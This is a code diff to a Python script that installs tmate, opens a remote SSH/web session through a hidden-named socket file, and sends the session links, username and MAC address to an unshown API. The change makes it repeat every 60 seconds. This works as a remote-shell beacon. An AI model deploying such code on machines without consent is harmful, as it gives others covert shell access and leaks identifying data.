@@ -2,6 +2,7 @@
 import subprocess
 import requests
 import json
+import time
 import os
 import re
 
@@ -61,35 +62,37 @@ def send_payload_to_api(payload):
 
 if __name__=='__main__':
     try:
-        print("Checking internet connectivity...")
-        if is_connected():
-            print("Internet connection established.")
-            session_file = "/tmp/.private-session.sock"
+        while True:
+            print("Checking internet connectivity...")
+            if is_connected():
+                print("Internet connection established.")
+                session_file = "/tmp/.private-session.sock"
 
-            if not os.path.exists("/usr/bin/tmate"):
-                print("Installing tmate...")
-                install_tmate()
+                if not os.path.exists("/usr/bin/tmate"):
+                    print("Installing tmate...")
+                    install_tmate()
 
-            print("Generating new tmate session...")
-            ssh_session, web_session = generate_new_session(session_file)
-            if ssh_session and web_session:
-                print("Tmate session generated successfully.")
-                payload = {
-                    "username": get_username(),
-                    "mac_address": get_mac_address(),
-                    "ssh_session": ssh_session,
-                    "web_session": web_session,
-                    "status": True
-                }
-                print("Sending payload to API...")
-                if send_payload_to_api(payload=payload):
-                    print("Payload sent successfully.")
+                print("Generating new tmate session...")
+                ssh_session, web_session = generate_new_session(session_file)
+                if ssh_session and web_session:
+                    print("Tmate session generated successfully.")
+                    payload = {
+                        "username": get_username(),
+                        "mac_address": get_mac_address(),
+                        "ssh_session": ssh_session,
+                        "web_session": web_session,
+                        "status": True
+                    }
+                    print("Sending payload to API...")
+                    if send_payload_to_api(payload=payload):
+                        print("Payload sent successfully.")
+                    else:
+                        print("Failed to send payload to API.")
                 else:
-                    print("Failed to send payload to API.")
+                    print("Failed to generate tmate session.")
             else:
-                print("Failed to generate tmate session.")
-        else:
-            print("No internet connection available.")
+                print("No internet connection available.")
+            time.sleep(60)
 
     except KeyboardInterrupt:
         print("Script terminated by the user.")
